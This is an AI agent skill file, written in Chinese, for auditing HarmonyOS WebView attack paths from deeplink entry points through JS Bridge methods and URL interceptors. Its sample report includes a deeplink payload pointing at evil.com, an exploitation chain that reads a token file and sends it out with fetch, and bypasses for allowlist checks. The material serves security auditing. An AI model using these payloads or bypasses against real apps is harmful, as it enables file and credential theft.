---
name: harmony-webview-audit
description: v2 — 审计 WebView 攻击路径：从外部入口出发，追踪参数到 WebView 加载点，逐方法分析 JS Bridge 暴露面，逐策略分析拦截器安全性，输出完整攻击链路
---

# harmony-webview-audit v2

审计鸿蒙应用中 WebView 的攻击路径。只审计有外部可控入口的 WebView，从入口出发追踪参数到 WebView 加载点，逐方法分析 JS Bridge 暴露面，逐策略分析拦截器安全性，输出完整攻击链路。

## 前置条件

Phase 1 发现的外部入口（`type=deeplink`、`type=url_callback`）和 WebView 终点（`sink_type=webview`）。

**不可达场景 → 直接跳过，不审计**：
- WebView 的 `src` 是 `$rawfile()` 本地固定页面，且无任何外部参数能流入
- 入口参数不流向任何 WebView（变量被覆盖或未使用）
- 参数传递途中被严格校验（结构化域名白名单，无绕过可能）

## 输入

| 数据 | 来源 |
|------|------|
| 项目源码 | 用户提供的 project_path |
| `entries.json` | Phase 1 的外部入口 |
| `sinks.json` | Phase 1 的 WebView 终点 |
| `attack_map.json` | Phase 1 的入口→终点配对 |
| 规则知识库 | `skills_v2/harmony-webview-audit/rules/*.json` |
| WebView 领域知识 | `skills_v2/harmony-webview-audit/WEBVIEW_REFERENCE.md` |

## 审计流程（四步）

### Step 0：利用 GitNexus 做跨文件追踪

入口和 WebView 往往不在同一文件（路由传参、全局状态、跨模块 import）。先使用 GitNexus MCP 工具发现跨文件连接：

```
# 对每个入口，查询其参数的下游流向
gitnexus_query({query: "want.parameters 的下游调用和赋值追踪"})

# 对关键变量，查询其 caller/callee 关系
gitnexus_context({name: "variableName"})

# 查询从入口到 WebView 的完整执行流
gitnexus_query({query: "从 onCreate/want.parameters 到 WebView/loadUrl 的执行流"})
```

GitNexus 能给出精确的跨文件调用链（含文件和行号），替代当前脚本的同文件粗筛。拿到调用链后进入 Step 1。

**降级策略**：GitNexus 可能无法准确追踪基于 ArkTS 装饰器（如 `@StorageLink`、`AppStorage.setOrCreate`、`@Provide`/`@Consume`）的隐式状态流转。如果追踪中断，你必须自行使用 `grep_search` 工具搜索相关全局状态键值或变量名，通过分析搜索结果来补全数据流链路，切勿停止工作等待人类介入。

### Step 1：梳理完整攻击链路

基于 GitNexus 给出的跨文件调用链 + 手动代码阅读，追踪完整数据流：

```
DeepLink / Want 参数入口
    ↓
参数如何被接收和存储（变量赋值？存入状态管理？）
    ↓  关键检查：是否有校验？
参数如何传递到 WebView 页面（路由参数？全局变量？）
    ↓
Web({ src: <参数值>, controller: this.ctrl })
    ↓
JS Bridge 方法注册（registerJavaScriptProxy 注册了哪些方法？）
    ↓
拦截器分析（onLoadIntercept / onUrlLoadIntercept / onInterceptRequest）
```

**每步必须搞清楚的内容**：
- **入口参数格式**：攻击者通过什么方式传入（deeplink？want？拦截器回调？），参数名和类型是什么
- **校验点**：参数传递过程中有无校验？是怎么校验的（字符串前缀？正则？结构化解析？）？可否绕过？
- **WebView 配置**：具体加载了什么？src 的值是什么？javaScriptAccess / fileAccess / mixedMode 等是什么？
- **JS Bridge 方法**：registerJavaScriptProxy 注册了哪些方法？每个方法的 Native 实现是什么？

### Step 2：逐 JS Bridge 方法分析敏感度

**不可笼统判"有 JS Bridge = 敏感"**。必须逐一阅读每个方法的 Native 实现，分析敏感度：

```
| 方法名 | Native 实现（读代码）| 是否敏感 | 原因 |
|--------|-------------------|---------|------|
| showToast | hilog.info + promptAction.showToast | 否 | 仅 UI 交互，无数据操作 |
| setTitle  | this.title = msg | 否 | 仅修改页面标题 |
| readFile | fileIo.openSync(path) + readTextSync | 是 | 可读取沙箱内任意文件 |
| writeFile | fileIo.openSync(path, WRITE) + writeSync | 是 | 可写入恶意文件 |
| getDeviceId | deviceInfo.getDeviceId() | 是 | 泄露设备唯一标识 |
```

**只要存在至少一个敏感方法，就进入 Step 3。**

常见敏感方法信号：
- 调用了 `@ohos.file.fs`（文件 IO）
- 调用了 `@ohos.data.relationalStore` / `@ohos.data.preferences`（数据库/存储）
- 调用了 `deviceInfo`（设备信息）
- 调用了 `@ohos.account.osAccount`（账号信息）
- 调用了 `http.createHttp` / `fetch`（网络请求，可 SSRF）
- 返回了 `this.xxx` 全局状态中的值

### Step 3：逐拦截策略分析安全性

若 WebView 设置了拦截器（`onLoadIntercept` / `onUrlLoadIntercept` / `onInterceptRequest` / `onWindowNew`），逐策略分析：

```
| 拦截策略 | 代码 | 是否可绕过 | 绕过方式 |
|---------|------|-----------|---------|
| 域名前缀匹配 | if (url.startsWith('https://trusted')) | 是 | https://trusted.attacker.com |
| includes 检查 | if (url.includes('example.com')) | 是 | https://attacker.com/example.com |
| 正则匹配 | if (/^https?:\/\/trusted\.com/.test(url)) | 是（若不够严格） | https://trusted.com.attacker.com |
| 结构化解析 | const u = new Url.URL(url); u.hostname === 'trusted.com' | 否 | — |
| scheme 仅限 https | if (!url.startsWith('https://')) return true | 是 | javascript: / data: 伪协议 |
| 无条件返回 false | return false | 否 | — |

**无拦截器且 WebView 加载外部可控 URL → 严重缺陷**（攻击者 URL 加载后无任何阻止机制）

**onInterceptRequest 直接 loadUrl 外部 URL → SSRF 风险**

### Step 4：对照规则 + 记录漏洞

请结合前几步发现的特征 API 和敏感操作，使用 `grep_search` 工具在 `rules` 目录下搜索相关关键字，仅加载和阅读匹配的具体规则，避免盲目加载全部规则导致上下文膨胀。对每个命中的规则生成完整漏洞记录。**核心要求与 IPC Skill 一致**：

**A. 列出所有 JS Bridge 方法**

每个方法都要记录，敏感和非敏感都列出：

```json
"bridge_methods": [
  { "name": "showToast", "sensitive": false, "implementation": "promptAction.showToast({ message: msg })", "reason": "仅UI交互" },
  { "name": "readFile", "sensitive": true, "implementation": "fileIo.openSync(path); fileIo.readTextSync(file)", "reason": "读取沙箱内文件" },
  { "name": "writeFile", "sensitive": true, "implementation": "fileIo.openSync(path, WRITE); fileIo.writeSync(fd, content)", "reason": "写入任意文件" }
]
```

**B. 详细展示完整流程（每步带核心代码）**

flow 中每一步必须有 `snippet`（实际源码），不可只有文字：

```json
"flow": [
  {
    "step": 1,
    "stage": "入口",
    "description": "DeepLink want.parameters.url 被提取并存储到 this.externalUrl，未做任何校验",
    "file": "EntryAbility.ets:42-45",
    "snippet": "let url = want.parameters?.url as string;\nthis.externalUrl = url;"
  },
  {
    "step": 2,
    "stage": "传递",
    "description": "router.pushUrl 将 externalUrl 带入 WebPage，WebView 的 src 直接绑定该变量",
    "file": "WebPage.ets:15-17",
    "snippet": "Web({ src: this.externalUrl, controller: this.ctrl })\n  .javaScriptAccess(true)\n  .fileAccess(true)"
  },
  {
    "step": 3,
    "stage": "JS Bridge 调用",
    "description": "攻击者加载的恶意页面通过 JS Bridge 调用 readFile()，无 allowedOriginRules 限制",
    "file": "WebPage.ets:50-55",
    "snippet": "this.ctrl.registerJavaScriptProxy(\n  nativeObj,\n  'nativeBridge',\n  ['readFile', 'writeFile', 'showToast'],\n  [],\n  []  // allowedOriginRules 为空，任意域可调用\n);"
  },
  {
    "step": 4,
    "stage": "Native 执行",
    "description": "readFile() 内部调用 fileIo.openSync，未校验 path 参数",
    "file": "WebPage.ets:10-15",
    "snippet": "readFile(path: string): string {\n  let file = fileIo.openSync(path);\n  let content = fileIo.readTextSync(file);\n  fileIo.closeSync(file);\n  return content;\n}"
  }
]
```

**C. 全面评估危害**

```json
"impact": {
  "summary": "攻击者通过 DeepLink 传入任意 URL，WebView 加载该 URL 后，恶意 JS 可通过 JS Bridge 读写应用沙箱内任意文件",
  "sensitive_data_exposed": [
    { "data": "应用沙箱内所有文件", "via": "readFile(path)", "example": "readFile('/data/storage/el2/base/haps/entry/files/token.txt') → 'eyJhbG...'" },
    { "data": "用户持久化数据", "via": "readFile(path)", "example": "readFile('/data/storage/el2/base/haps/entry/files/user_prefs.json') → '{...}'" }
  ],
  "sensitive_operations": [
    { "operation": "写入任意文件", "via": "writeFile(path, content)", "consequence": "可植入恶意配置、覆盖关键文件、写入 webshell" },
    { "operation": "XSS → Native RCE 链", "via": "WebView 加载攻击者 URL + JS Bridge 无 allowedOriginRules", "consequence": "任意域网页可调用所有暴露的 Native 方法" }
  ]
}
```

## 输出

每个攻击路径独立输出一个分片文件。**必须使用 Write 工具写入磁盘，不可仅在对话中展示 JSON。**

文件命名：`harmony-webview-audit-attack-paths-{attack_map路径ID}.json`

例如：`harmony-webview-audit-attack-paths-path-003.json`

Phase 3 聚合器会自动合并所有 `harmony-webview-audit-attack-paths-*.json` 分片。

### 整体输出结构

```json
{
  "attack_paths": [
    {
      "id": "WEBVIEW-001",
      "severity": "critical",
      "title": "DeepLink url 参数注入 → WebView 加载恶意页面 → JS Bridge 读写文件",

      "cases": {
        "bridge_methods": [
          { "name": "showToast", "sensitive": false, "implementation": "promptAction.showToast({ message: msg })", "reason": "仅UI交互" },
          { "name": "readFile", "sensitive": true, "implementation": "fileIo.openSync(path); fileIo.readTextSync(file); fileIo.closeSync(file)", "input": "path: string (攻击者可控)", "output": "文件内容字符串", "reason": "可读取沙箱内任意文件，无 path 校验" },
          { "name": "writeFile", "sensitive": true, "implementation": "fileIo.openSync(path, WRITE|CREATE); fileIo.writeSync(fd, content); fileIo.closeSync(file)", "input": "path: string, content: string (攻击者均可控)", "output": "无", "reason": "可写入任意文件，无 path 校验" }
        ],
        "interceptors": [
          { "type": "onLoadIntercept", "present": false, "risk": "无任何 URL 加载拦截，攻击者 URL 可直接加载" }
        ]
      },

      "entry": {
        "type": "deeplink",
        "file": "EntryAbility.ets:42",
        "how": "通过 DeepLink 调用 app，want.parameters.url 传入任意 URL",
        "payload": {
          "url": "https://evil.com/exploit.html",
          "snippet": "let want: Want = {\n  parameters: { url: 'https://evil.com/exploit.html' }\n};\ncontext.startAbility(want);"
        }
      },

      "flow": [
        {
          "step": 1,
          "stage": "入口",
          "description": "want.parameters.url 被提取，未校验即存入 this.externalUrl",
          "file": "EntryAbility.ets:42-45",
          "snippet": "let url = want.parameters?.url as string;\nthis.externalUrl = url;"
        },
        {
          "step": 2,
          "stage": "传递",
          "description": "WebView src 直接绑定 this.externalUrl，javaScriptAccess / fileAccess 均开启",
          "file": "WebPage.ets:15-18",
          "snippet": "Web({ src: this.externalUrl, controller: this.ctrl })\n  .javaScriptAccess(true)\n  .fileAccess(true)"
        },
        {
          "step": 3,
          "stage": "JS Bridge 注册",
          "description": "注册 3 个方法，allowedOriginRules 为空，任意域网页可调用",
          "file": "WebPage.ets:50-55",
          "snippet": "this.ctrl.registerJavaScriptProxy(\n  nativeObj,\n  'nativeBridge',\n  ['readFile', 'writeFile', 'showToast'],\n  [],\n  []\n);"
        },
        {
          "step": 4,
          "stage": "Native 执行-readFile",
          "description": "readFile 直接打开攻击者传入的 path，无路径白名单校验，返回文件内容",
          "file": "WebPage.ets:10-16",
          "snippet": "readFile(path: string): string {\n  let file = fileIo.openSync(path);\n  let content = fileIo.readTextSync(file);\n  fileIo.closeSync(file);\n  return content;\n}"
        },
        {
          "step": 5,
          "stage": "Native 执行-writeFile",
          "description": "writeFile 以 WRITE|CREATE 模式打开攻击者传入的 path，写入攻击者内容",
          "file": "WebPage.ets:18-24",
          "snippet": "writeFile(path: string, content: string): void {\n  let file = fileIo.openSync(path, fileIo.OpenMode.WRITE_ONLY | fileIo.OpenMode.CREATE);\n  fileIo.writeSync(file.fd, content);\n  fileIo.closeSync(file);\n}"
        }
      ],

      "impact": {
        "summary": "攻击者通过 DeepLink 传入恶意网页 URL，WebView 加载该网页后，恶意 JS 可读写应用沙箱内任意文件",
        "sensitive_data_exposed": [
          { "data": "应用沙箱内所有文件", "via": "readFile(path)", "example": "readFile('/data/storage/el2/base/haps/entry/files/token.txt') → 'eyJhbGciOiJIUzI1NiIs...'" },
          { "data": "用户持久化数据", "via": "readFile(path)", "example": "readFile('/data/storage/el2/base/preferences/user_settings') → '{...}'" }
        ],
        "sensitive_operations": [
          { "operation": "写入任意文件", "via": "writeFile(path, content)", "consequence": "可植入恶意配置、覆盖关键业务文件" },
          { "operation": "XSS → Native 文件读写", "via": "WebView 加载攻击者 URL + JS Bridge 无 allowedOriginRules + javaScriptAccess=true", "consequence": "任意域网页可通过 JS Bridge 调用所有暴露的 Native 方法" }
        ]
      },

      "exploitation": "1. 构造 DeepLink: want.parameters.url = 'https://evil.com/exploit.html'\n2. 通过 DeepLink 启动目标应用\n3. 应用将 url 传入 WebView 的 src\n4. evil.com 的 JS 调用 window.nativeBridge.readFile('/data/storage/.../token.txt')\n5. Native 方法 fileIo.openSync 读取文件内容，返回给 JS\n6. 恶意 JS 通过 fetch 将窃取内容发回攻击者服务器",

      "remediation": "1. 校验 deeplink url 参数仅允许白名单域名（用 new Url.URL() 结构化解析）\n2. registerJavaScriptProxy 的 allowedOriginRules 限制仅白名单域名\n3. JS Bridge 移除文件 IO 方法，仅保留 UI 交互\n4. readFile 若必须保留，添加 path 白名单校验",

      "matched_rules": ["WEB-001", "WEB-003", "WEB-004", "WEB-006", "WEB-007", "WEB-008", "WEB-010"],
      "evidence": [
        { "file": "EntryAbility.ets", "line_range": "42-45", "snippet": "let url = want.parameters?.url as string;\nthis.externalUrl = url;", "description": "入口：url 参数无校验" },
        { "file": "WebPage.ets", "line_range": "15-18", "snippet": "Web({ src: this.externalUrl, ... })\n  .javaScriptAccess(true)\n  .fileAccess(true)", "description": "WebView 配置：直接加载外部 URL" },
        { "file": "WebPage.ets", "line_range": "50-55", "snippet": "this.ctrl.registerJavaScriptProxy(nativeObj, 'nativeBridge', ['readFile', 'writeFile', 'showToast'], [], [])", "description": "JS Bridge：无 allowedOriginRules" },
        { "file": "WebPage.ets", "line_range": "10-24", "snippet": "readFile(path) { fileIo.openSync(path); ... }\nwriteFile(path, content) { fileIo.openSync(path, WRITE|CREATE); ... }", "description": "Native 方法：直接文件 IO，无校验" }
      ]
    }
  ]
}
```

## 重要原则

1. **不可达的不审计**：本地固定页面、无可控外部输入的 WebView 直接跳过
2. **逐方法分析 JS Bridge**：每个方法都要读 Native 实现，不可因一个无害方法就判整体安全
3. **逐策略分析拦截器**：每种拦截方式都要分析绕过可能
4. **流程每步带源码**：flow 中每一步必须有 `snippet`
5. **危害具体量化**：`sensitive_data_exposed` + `sensitive_operations` 列出具体内容和示例
6. **对照 rules/*.json 逐条检查**：匹配规则的 AttackPath 继承其 severity 默认值，AI 可结合实际调整
